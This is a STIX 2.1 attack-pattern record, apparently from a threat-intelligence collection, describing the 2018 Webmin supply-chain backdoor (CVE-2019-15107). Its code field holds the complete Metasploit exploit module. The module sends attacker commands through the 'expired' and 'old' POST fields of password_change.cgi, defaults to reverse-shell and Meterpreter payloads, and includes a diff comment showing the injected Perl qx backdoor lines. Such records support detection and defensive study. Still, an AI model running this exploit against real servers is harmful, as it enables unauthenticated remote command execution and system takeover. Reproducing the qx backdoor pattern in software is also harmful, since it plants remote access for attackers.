{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d198873e-b3fe-4f91-8bb7-41d59c400c57",
    "created": "2024-08-14T17:04:14.730226Z",
    "modified": "2024-08-14T17:04:14.73023Z",
    "name": "Webmin password_change.cgi Backdoor",
    "description": " This module exploits a backdoor in Webmin versions 1.890 through 1.920. Only the SourceForge downloads were backdoored, but they are listed as official downloads on the project's site.  Unknown attacker(s) inserted Perl qx statements into the build server's source code on two separate occasions: once in April 2018, introducing the backdoor in the 1.890 release, and in July 2018, reintroducing the backdoor in releases 1.900 through 1.920.  Only version 1.890 is exploitable in the default install. Later affected versions require the expired password changing feature to be enabled. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/webmin_backdoor.rb",
            "external_id": "webmin_backdoor.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.webmin.com/exploit.html"
        },
        {
            "source_name": "reference",
            "url": "https://pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html"
        },
        {
            "source_name": "reference",
            "url": "https://blog.firosolutions.com/exploits/webmin/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/webmin/webmin/issues/947"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Module::Deprecated\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  moved_from 'exploit/unix/webapp/webmin_backdoor'\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'               => 'Webmin password_change.cgi Backdoor',\n      'Description'        => %q{\n        This module exploits a backdoor in Webmin versions 1.890 through 1.920.\n        Only the SourceForge downloads were backdoored, but they are listed as\n        official downloads on the project's site.\n\n        Unknown attacker(s) inserted Perl qx statements into the build server's\n        source code on two separate occasions: once in April 2018, introducing\n        the backdoor in the 1.890 release, and in July 2018, reintroducing the\n        backdoor in releases 1.900 through 1.920.\n\n        Only version 1.890 is exploitable in the default install. Later affected\n        versions require the expired password changing feature to be enabled.\n      },\n      'Author'             => [\n        'AkkuS', # (\u00d6zkan Mustafa Akku\u015f) Discovery and independent module\n        'wvu'    # This module and updated information about the backdoor\n      ],\n      'References'         => [\n        ['CVE', '2019-15107'], # y tho\n        ['URL', 'http://www.webmin.com/exploit.html'],\n        ['URL', 'https://pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html'],\n        ['URL', 'https://blog.firosolutions.com/exploits/webmin/'],\n        ['URL', 'https://github.com/webmin/webmin/issues/947']\n      ],\n      'DisclosureDate'     => '2019-08-10',\n      'License'            => MSF_LICENSE,\n      'Platform'           => ['unix', 'linux'],\n      'Arch'               => [ARCH_CMD, ARCH_X86, ARCH_X64],\n      'Privileged'         => true,\n      'Targets'            => [\n        ['Automatic (Unix In-Memory)',\n          'Platform'       => 'unix',\n          'Arch'           => ARCH_CMD,\n          'Version'        => [\n            Rex::Version.new('1.890'), Rex::Version.new('1.920')\n          ],\n          'Type'           => :unix_memory,\n          'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse_perl'}\n        ],\n        ['Automatic (Linux Dropper)',\n          'Platform'       => 'linux',\n          'Arch'           => [ARCH_X86, ARCH_X64],\n          'Version'        => [\n            Rex::Version.new('1.890'), Rex::Version.new('1.920')\n          ],\n          'Type'           => :linux_dropper,\n          'DefaultOptions' => {'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'}\n        ]\n      ],\n      'DefaultTarget'      => 0,\n      'Notes'              => {\n        'Stability'        => [CRASH_SAFE],\n        'Reliability'      => [REPEATABLE_SESSION],\n        'SideEffects'      => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n      }\n    ))\n\n    register_options([\n      Opt::RPORT(10000),\n      OptString.new('TARGETURI', [true, 'Base path to Webmin', '/'])\n    ])\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path)\n    )\n\n    unless res\n      vprint_error('Server did not respond')\n      return CheckCode::Unknown\n    end\n\n    if res.body.include?('This web server is running in SSL mode.')\n      print_error('Please enable the SSL option to proceed')\n      return CheckCode::Unknown\n    end\n\n    version =\n      res.headers['Server'].to_s.scan(%r{MiniServ/([\\d.]+)}).flatten.first\n\n    unless version\n      vprint_error('Webmin version not detected')\n      return CheckCode::Unknown\n    end\n\n    version = Rex::Version.new(version)\n\n    vprint_status(\"Webmin #{version} detected\")\n    checkcode = CheckCode::Detected\n\n    unless version.between?(*target['Version'])\n      vprint_error(\"Webmin #{version} is not a supported target\")\n      return CheckCode::Safe\n    end\n\n    vprint_good(\"Webmin #{version} is a supported target\")\n    checkcode = CheckCode::Appears\n\n    res = execute_command(\"echo #{token}\")\n\n    unless res\n      vprint_error('Webmin did not respond to check command')\n      return checkcode\n    end\n\n    if res.body.include?('Password changing is not enabled!')\n      vprint_error('Expired password changing disabled')\n      return CheckCode::Safe\n    end\n\n    if res.body.include?(token)\n      vprint_good('Webmin executed a benign check command')\n      checkcode = CheckCode::Vulnerable\n    else\n      vprint_error('Webmin did not execute our check command')\n      return CheckCode::Safe\n    end\n\n    checkcode\n  end\n\n  def exploit\n    # These CheckCodes are allowed to pass automatically\n    checkcodes = [\n      CheckCode::Appears,\n      CheckCode::Vulnerable\n    ]\n\n    print_status(\"Configuring #{target.name} target\")\n\n    case target['Type']\n    when :unix_memory\n      print_status(\"Sending #{datastore['PAYLOAD']} command payload\")\n      vprint_status(\"Generated command payload: #{payload.encoded}\")\n\n      res = execute_command(payload.encoded)\n\n      if res && datastore['PAYLOAD'] == 'cmd/unix/generic'\n        print_warning('Dumping command output in full response body')\n\n        if res.body.empty?\n          print_error('Empty response body, no command output')\n          return\n        end\n\n        print_line(res.body)\n      end\n    when :linux_dropper\n      print_status(\"Sending #{datastore['PAYLOAD']} command stager\")\n      execute_cmdstager\n    end\n  end\n\n=begin\nwvu@kharak:~/Downloads$ diff3 webmin-1.{890,930,920}/password_change.cgi\n====2\n1:1c\n3:1c\n  #!/usr/bin/perl\n2:1c\n  #!/usr/local/bin/perl\n====1\n1:12c\n  $in{'expired'} eq '' || die $text{'password_expired'},qx/$in{'expired'}/;\n2:12c\n3:12c\n  $miniserv{'passwd_mode'} == 2 || die \"Password changing is not enabled!\";\n====3\n1:40c\n2:40c\n  \t$enc eq $wuser->{'pass'} || &pass_error($text{'password_eold'});\n3:40c\n  \t$enc eq $wuser->{'pass'} || &pass_error($text{'password_eold'},qx/$in{'old'}/);\n====3\n1:200c\n2:200c\n  # Show ok page\n3:200c\n\nwvu@kharak:~/Downloads$\n=end\n  def execute_command(cmd, _opts = {})\n    send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.path, 'password_change.cgi'),\n      'headers'   => {'Referer' => full_uri},\n      'vars_post' => {\n        # 1.890\n        'expired' => cmd,\n        # 1.900-1.920\n        'new1'    => token,\n        'new2'    => token,\n        'old'     => cmd\n      }\n    }, 3.5)\n  end\n\n  def token\n    @token ||= Rex::Text.rand_text_alphanumeric(8..42)\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2019-08-10",
    "x_mitre_platforms": [
        "linux'"
    ]
}